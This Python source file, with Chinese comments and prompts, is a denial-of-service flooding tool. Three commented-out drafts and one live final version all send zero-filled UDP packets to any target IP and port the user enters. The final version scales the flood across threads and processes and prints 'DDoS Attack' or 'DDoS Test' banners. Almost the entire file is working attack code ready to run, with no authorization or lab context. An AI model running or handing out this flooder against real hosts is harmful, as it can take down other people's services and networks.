# import socket
# import os
#
# # 提示用户输入目标 IP 地址、端口号和数据包大小
# target_ip = input("请输入目标 IP 地址：")
# target_port = int(input("请输入目标端口号："))
# packet_size = int(input("请输入数据包大小（字节）："))
#
# # 创建一个 UDP 套接字
# sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
# # 创建一个指定大小的数据包，填充内容为 0
# packet = b'\x00' * packet_size
#
# sent = 0
# try:
#     while True:
#         # 向目标 IP 地址和端口发送数据包
#         sock.sendto(packet, (target_ip, target_port))
#         sent += 1
#         print(f"已发送数据包数量: {sent} 到 {target_ip}:{target_port}")
# except KeyboardInterrupt:
#     print("\n攻击已停止。")


# import socket
# import threading
# import time
# import os
#
# # 获取用户输入
# target_ip = input("请输入目标 IP 地址：")
# target_port = int(input("请输入目标端口号："))
# packet_size = int(input("请输入数据包大小（字节）："))
# send_rate = float(input("请输入每秒发送数据包的数量："))
# duration = int(input("请输入攻击持续时间（秒）："))
#
# # 创建数据包
# packet = b'\x00' * packet_size
#
# # 清屏并显示标志
# os.system('clear')
# os.system('figlet DDos Attack')
#
# # 统计信息
# sent_packets = 0
# lock = threading.Lock()  # 用于线程间同步计数
#
#
# # 发送数据包的线程函数
# def send_packets():
#     global sent_packets
#     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
#     end_time = time.time() + duration
#
#     while time.time() < end_time:
#         sock.sendto(packet, (target_ip, target_port))
#
#         # 更新计数器
#         with lock:
#             sent_packets += 1
#
#         # 控制发送频率
#         time.sleep(1 / send_rate)
#
#
# # 启动多线程发送
# thread_count = 5  # 可调整线程数量
# threads = []
#
# print(f"开始攻击 {target_ip}:{target_port}，数据包大小：{packet_size} 字节，持续时间：{duration} 秒。")
#
# for i in range(thread_count):
#     thread = threading.Thread(target=send_packets)
#     thread.start()
#     threads.append(thread)
#
# # 主线程统计发送速率
# start_time = time.time()
# try:
#     while time.time() < start_time + duration:
#         time.sleep(1)  # 每秒打印一次统计
#         with lock:
#             print(
#                 f"已发送数据包总数: {sent_packets}，每秒发送速率: {sent_packets / (time.time() - start_time):.2f} 个/秒")
# except KeyboardInterrupt:
#     print("\n攻击已停止。")
#
# # 等待所有线程结束
# for thread in threads:
#     thread.join()
#
# print(f"攻击结束，共发送数据包: {sent_packets}")


# import socket
# import threading
# import multiprocessing
# import time
# import os
#
#
# # 获取用户输入的函数
# def get_user_input():
#     target_ip = input("请输入目标 IP 地址：")
#     target_port = int(input("请输入目标端口号："))
#     packet_size = int(input("请输入数据包大小（字节）："))
#     send_rate = int(input("请输入每秒发送的数据包数量（每个线程）："))
#     duration = int(input("请输入攻击持续时间（秒）："))
#     thread_count = int(input("请输入每个进程的线程数："))
#     process_count = int(input("请输入进程数（模拟多个客户端）："))
#
#     return target_ip, target_port, packet_size, send_rate, duration, thread_count, process_count
#
#
# # 创建数据包
# def create_packet(packet_size):
#     return b'\x00' * packet_size
#
#
# # 发送数据包的线程函数
# def send_packets(target_ip, target_port, packet, send_rate, duration):
#     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
#     end_time = time.time() + duration
#     while time.time() < end_time:
#         sock.sendto(packet, (target_ip, target_port))
#         time.sleep(1 / send_rate)  # 控制发送频率
#
#
# # 进程函数，启动多个线程
# def start_threads(target_ip, target_port, packet, send_rate, duration, thread_count):
#     threads = []
#     for _ in range(thread_count):
#         thread = threading.Thread(target=send_packets, args=(target_ip, target_port, packet, send_rate, duration))
#         thread.start()
#         threads.append(thread)
#
#     # 等待所有线程结束
#     for thread in threads:
#         thread.join()
#
#
# # 主函数，启动多个进程
# def main():
#     # 获取用户输入
#     target_ip, target_port, packet_size, send_rate, duration, thread_count, process_count = get_user_input()
#
#     # 创建数据包
#     packet = create_packet(packet_size)
#
#     # 清屏并显示标志
#     os.system('clear')
#     os.system('figlet DDoS Test')
#
#     processes = []
#     print(f"正在向 {target_ip}:{target_port} 发送数据包，数据包大小：{packet_size} 字节，持续时间：{duration} 秒。")
#
#     # 启动多个进程
#     for _ in range(process_count):
#         process = multiprocessing.Process(target=start_threads,
#                                           args=(target_ip, target_port, packet, send_rate, duration, thread_count))
#         process.start()
#         processes.append(process)
#
#     # 等待所有进程结束
#     for process in processes:
#         process.join()
#
#     print("测试结束。")
#
#
# if __name__ == "__main__":
#     main()
#


import socket
import threading
import multiprocessing
import time
import os


# 获取用户输入的函数
def get_user_input():
    target_ip = input("请输入目标 IP 地址：")
    target_port = int(input("请输入目标端口号："))
    packet_size = int(input("请输入数据包大小（字节）："))
    send_rate = int(input("请输入每秒发送的数据包数量（每个线程）："))
    duration = int(input("请输入攻击持续时间（秒）："))
    thread_count = int(input("请输入每个进程的线程数："))
    process_count = int(input("请输入进程数（模拟多个客户端）："))

    return target_ip, target_port, packet_size, send_rate, duration, thread_count, process_count


# 创建数据包
def create_packet(packet_size):
    return b'\x00' * packet_size


# 发送数据包的线程函数
def send_packets(target_ip, target_port, packet, send_rate, duration):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    end_time = time.time() + duration
    while time.time() < end_time:
        sock.sendto(packet, (target_ip, target_port))
        time.sleep(1 / send_rate)  # 控制发送频率


# 进程函数，启动多个线程
def start_threads(target_ip, target_port, packet, send_rate, duration, thread_count):
    threads = []
    for _ in range(thread_count):
        thread = threading.Thread(target=send_packets, args=(target_ip, target_port, packet, send_rate, duration))
        thread.start()
        threads.append(thread)

    # 等待所有线程结束
    for thread in threads:
        thread.join()


# 主函数，启动多个进程
def main():
    # 获取用户输入
    target_ip, target_port, packet_size, send_rate, duration, thread_count, process_count = get_user_input()

    # 创建数据包
    packet = create_packet(packet_size)

    # 清屏并显示标志
    os.system('clear')
    os.system('figlet DDoS Test')

    processes = []
    print(f"正在向 {target_ip}:{target_port} 发送数据包，数据包大小：{packet_size} 字节，持续时间：{duration} 秒。")

    # 启动多个进程
    for _ in range(process_count):
        process = multiprocessing.Process(target=start_threads,
                                          args=(target_ip, target_port, packet, send_rate, duration, thread_count))
        process.start()
        processes.append(process)

    # 等待所有进程结束
    for process in processes:
        process.join()

    print("测试结束。")


if __name__ == "__main__":
    main()